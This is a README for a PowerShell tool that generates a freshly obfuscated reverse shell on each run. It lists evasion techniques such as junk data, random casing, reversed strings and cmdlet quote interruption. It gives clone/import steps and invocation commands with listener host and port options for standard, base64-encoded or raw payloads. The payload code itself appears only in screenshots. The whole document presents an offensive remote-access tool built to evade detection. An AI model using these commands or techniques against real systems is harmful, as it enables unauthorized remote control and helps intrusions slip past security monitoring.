# DynamicPSHRSH - PS Based RevShell Generator Script
- A nice little PowerShell script I wrote for generating an obfuscated Powershell based reverse-shell. Eachtime the script is ran, a whole new reverse shell with different set of obfuscations is generated.
- The script has inbuilt pre-defined set of obfuscation techniques ranging from :
  - Random junk data
  - Random letter cases
  - Reversed strings
  - Cmdlet obfuscation (Via quote interruption and other techniques to retrieve the original Cmdlet)
  - Randomly generated variable names
  - Object name obfuscation 

![image](https://github.com/user-attachments/assets/2e0ba0a2-c7e1-4538-a879-333f98532cfd)

## Installation :

```
git clone https://github.com/Vedant-Bhalgama/DynamicPSHRSH.git
Import-Module .\DynamicPSHRSHGen.ps1
Invoke-DynamicRSH
```

## Usage : 

```
Dynamic Powershell Reverse Shell Generator v1.0 - By @ActiveXSploit

Usage: Invoke-DynamicRSH -LHOST <L_IP> -LPORT <L_PORT> [-B64Encode or -Raw or Standard]

Required Arguments : 
   -LHOST  :  Specify listening host IP Address/Hostname
   -LPORT  :  Specify listening port number

Positional Arguments :
   -B64Encode  :  Payload execution via the -e switch (Base64 Encoded)
   -Raw        :  Raw reverse shell code template (No encodings + W/O Additional Powershell switches)
   -c          :  Standard execution (No encodings + Additional Powershell switches)
```

## Examples :
  ### 1. Standard Payload Template : 
    Invoke-DynamicRSH -LHOST 127.0.0.1 -LPORT 443 -c
![image](https://github.com/user-attachments/assets/d1a197d7-0024-4d83-b1cd-cfdb08a1ed58)

  ### 2. Base64 Encoded Payload Template :
    Invoke-DynamicRSH -LHOST 127.0.0.1 -LPORT 443 -B64Encode
![image](https://github.com/user-attachments/assets/36de92cc-92d3-4a95-9586-314f0e83ea71)

  ### 3. Raw PowerShell Code Template : 
    Invoke-DynamicRSH -LHOST 127.0.0.1 -LPORT 443 -Raw
![image](https://github.com/user-attachments/assets/eee97999-c295-45a5-b34a-cd185d54318e)
